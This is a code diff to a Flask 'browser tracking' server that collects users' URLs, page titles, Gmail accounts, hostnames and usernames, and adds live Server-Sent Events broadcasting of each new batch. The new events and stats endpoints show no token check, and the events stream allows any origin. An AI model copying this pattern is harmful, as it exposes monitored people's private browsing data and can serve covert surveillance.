@@ -1,7 +1,9 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, Response
 from flask_cors import CORS
 import json
 import os
+import time
+import threading
 from datetime import datetime
 from database import BrowserTrackingDB
 from logger import setup_logger
@@ -38,6 +40,48 @@ if is_vercel and not db_path.startswith('/tmp'):
     db_path = '/tmp/browser_tracking.db'
 
 db = BrowserTrackingDB(db_path)
+
+# Real-time notification system
+class RealtimeNotifier:
+    def __init__(self):
+        self.clients = []
+        self.last_activity_count = 0
+
+    def add_client(self, client):
+        self.clients.append(client)
+        logger.info(f"SSE client connected. Total: {len(self.clients)}")
+
+    def remove_client(self, client):
+        if client in self.clients:
+            self.clients.remove(client)
+            logger.info(f"SSE client disconnected. Total: {len(self.clients)}")
+
+    def notify_new_activity(self, activity_data):
+        """Notify all connected clients of new activity"""
+        if not self.clients:
+            return
+
+        message = json.dumps({
+            'type': 'new_activity',
+            'data': activity_data,
+            'timestamp': datetime.now().isoformat()
+        })
+
+        # Send to all connected clients
+        disconnected_clients = []
+        for client in self.clients:
+            try:
+                client.put(f"data: {message}\n\n")
+            except:
+                disconnected_clients.append(client)
+
+        # Remove disconnected clients
+        for client in disconnected_clients:
+            self.remove_client(client)
+
+        logger.info(f"Notified {len(self.clients)} clients of new activity")
+
+notifier = RealtimeNotifier()
 
 def verify_token(token):
     """Verify API token"""
@@ -117,9 +161,35 @@ def submit_browsing_data():
         
         if success:
             logger.info(f"Received {len(browsing_data)} browsing entries from client {client_id}")
+
+            # Trigger real-time notification
+            try:
+                # Get client info for notification
+                client_info = db.get_client_info(client_id)
+
+                # Prepare notification data
+                notification_data = []
+                for entry in browsing_data:
+                    notification_data.append({
+                        'hostname': client_info.get('hostname', 'Unknown') if client_info else 'Unknown',
+                        'username': client_info.get('username', 'Unknown') if client_info else 'Unknown',
+                        'url': entry.get('url', ''),
+                        'title': entry.get('title', ''),
+                        'visit_time': entry.get('visit_time', ''),
+                        'profile_name': entry.get('profile_name', ''),
+                        'gmail_account': entry.get('gmail_account', '')
+                    })
+
+                # Notify connected clients
+                notifier.notify_new_activity(notification_data)
+
+            except Exception as e:
+                logger.error(f"Error sending real-time notification: {e}")
+
             return jsonify({
                 'success': True,
-                'message': f'Processed {len(browsing_data)} entries'
+                'message': f'Processed {len(browsing_data)} entries',
+                'realtime_notified': len(notifier.clients) > 0
             })
         else:
             return jsonify({'error': 'Failed to process browsing data'}), 500
@@ -169,9 +239,72 @@ def get_activity():
             'activity': activity,
             'count': len(activity)
         })
-        
+
     except Exception as e:
         logger.error(f"Error getting activity: {e}")
+        return jsonify({'error': 'Internal server error'}), 500
+
+@app.route('/api/events')
+def events():
+    """Server-Sent Events endpoint for real-time updates"""
+    def event_stream():
+        import queue
+        client_queue = queue.Queue()
+        notifier.add_client(client_queue)
+
+        try:
+            # Send initial connection message
+            yield f"data: {json.dumps({'type': 'connected', 'message': 'Real-time connection established'})}\n\n"
+
+            # Send current activity count
+            try:
+                activity = db.get_recent_activity(24, 1000)
+                yield f"data: {json.dumps({'type': 'initial_data', 'count': len(activity)})}\n\n"
+            except:
+                pass
+
+            # Keep connection alive and send updates
+            while True:
+                try:
+                    # Wait for new data with timeout
+                    message = client_queue.get(timeout=30)
+                    yield message
+                except queue.Empty:
+                    # Send heartbeat to keep connection alive
+                    yield f"data: {json.dumps({'type': 'heartbeat', 'timestamp': datetime.now().isoformat()})}\n\n"
+                except:
+                    break
+        finally:
+            notifier.remove_client(client_queue)
+
+    return Response(event_stream(), mimetype='text/event-stream',
+                   headers={'Cache-Control': 'no-cache',
+                           'Connection': 'keep-alive',
+                           'Access-Control-Allow-Origin': '*',
+                           'Access-Control-Allow-Headers': 'Cache-Control'})
+
+@app.route('/api/stats')
+def get_stats():
+    """Get real-time statistics"""
+    try:
+        # Get activity count
+        activity = db.get_recent_activity(24, 1000)
+
+        # Get active clients count
+        clients = db.get_active_clients()
+
+        return jsonify({
+            'success': True,
+            'stats': {
+                'total_activities': len(activity),
+                'active_clients': len(clients),
+                'connected_sse_clients': len(notifier.clients),
+                'last_update': datetime.now().isoformat()
+            }
+        })
+
+    except Exception as e:
+        logger.error(f"Error getting stats: {e}")
         return jsonify({'error': 'Internal server error'}), 500
 
 @app.errorhandler(404)
